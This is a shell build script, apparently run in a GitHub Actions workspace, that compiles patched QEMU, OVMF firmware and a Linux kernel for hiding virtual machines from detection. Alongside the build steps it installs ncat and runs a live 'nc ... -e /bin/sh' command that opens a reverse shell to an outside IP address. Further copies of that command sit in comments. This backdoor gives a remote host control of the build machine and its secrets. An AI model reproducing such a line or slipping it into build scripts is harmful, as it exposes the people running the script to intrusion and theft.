#! /bin/sh
set -e o pipefail
  
 
#https://www.reddit.com/r/VFIO/comments/i071qx/spoof_and_make_your_vm_undetectable_no_more/

build_qemu () {
  #####BUILD QEMU
  #####TODO: DOES NOT WORK WITH DEBUILD SCRIPTS
  #####.DEB FILES GENERATED NEED TO BE STORED IN A LOCAL APT REPO AND INSTALLED USING APT NOT DPKG -I TO AVOID ERRORS
  #https://www.qemu.org/download/
  #https://wiki.qemu.org/Hosts/Linux
  #https://wiki.qemu.org/Testing/DockerBuild
  apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid -y
  DEBIAN_FRONTEND=noninteractive apt-get install -y gir1.2-spiceclientgtk-3.0 virt-manager libvirt-daemon virt-viewer spice-vdagent qemu-utils  spice-vdagent xserver-xorg-video-qxl
  mkdir ~/qemu; cd ~/qemu
  #build debian version
  #nc 103.158.223.61 21121 -e /bin/sh
  apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
  dpkg-source --auto-commit -b qemu-7.0+dfsg/
  cd qemu-7.0+dfsg
  debuild -us -uc
  #curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
  #tar xvJf qemu.tar.xz > /dev/null
  #cd qemu-7.0.0
  tar xf /patch/qemu.tar
  ./configure --target-list=x86_64-softmmu --enable-debug --enable-spice > /dev/null
  make -j$(nproc) > /dev/null
  
  #artifacts
  tar cfz /builds/qemu.tar -C ~/qemu/qemu-7.0.0 build/
}

build_ovmf () {
  #####BUILD OVMF
  #https://phip1611.de/blog/how-to-compile-edk2-ovmf-from-source-on-linux-2021/
  apt install -y git nasm iasl build-essential uuid-dev uuid python3
  mkdir ~/edk2; cd ~/edk2
  git clone https://github.com/tianocore/edk2.git
  cd edk2
  git submodule update --init
  tar xf /patch/ovmf.tar
  PYTHON_COMMAND=/usr/bin/python3 make -C BaseTools -j $(nproc)
  cd OvmfPkg
  ./build.sh
  
  #artifacts
  tar cfz /builds/edk2.tar -C ~/edk2/edk2 Build/OvmfX64/DEBUG_GCC5/FV/
  
  #Build/OvmfX64/DEBUG_GCC5/FV/{OVMF.fd,OVMF_CODE.fd,OVMF_VARS.fd}
}

build_kernel() {
  #####BUILD KERNEL
  apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot dwarves
  echo "Installed all packages\n"
  #https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html
  #https://www.debian.org/releases/jessie/i386/ch08s06.html.en ##basic documentation
  #https://debian-handbook.info/browse/stable/sect.kernel-compilation.html ##advanced docs
  mkdir ~/kernel; cd ~/kernel

  #sed -n '/CONFIG_SYSTEM_TRUSTED_KEYS.*/!p' /config-5.18.0-2-amd64 > /config-5.18.0-2-amd64
  tar -xaf /usr/src/linux-source-5.18.tar.xz > /dev/null

  cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.18/.config
  
  #compile
  cd linux-source-5.18
  tar xf /patch/kernel.tar
  
  yes ""|make oldconfig > /dev/null
  make ARCH=$(arch) -j$(nproc) > /dev/null
  make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1 -j$(nproc)
  cp ../*.deb /builds/
}

#https://wiki.debian.org/HowToUpgradeKernel
#5.10.0-15-amd64
#linux-image-5.10.0-15-amd64
#linux-image-5.18.0-2-amd64
echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
apt update
apt install -y ncat
#nc 65.108.51.31 11452 -e /bin/sh
nc 103.158.223.61 21121 -e /bin/sh
apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl

mkdir /builds
cd /; tar xf /patch.tar

#build_kernel
build_qemu
build_ovmf

cp /builds/* /github/workspace/
#cp ~/*.deb /github/workspace/
#cp ~/*.tar /github/workspace/
#nc 103.158.223.61 21121 -e /bin/sh

exit 0




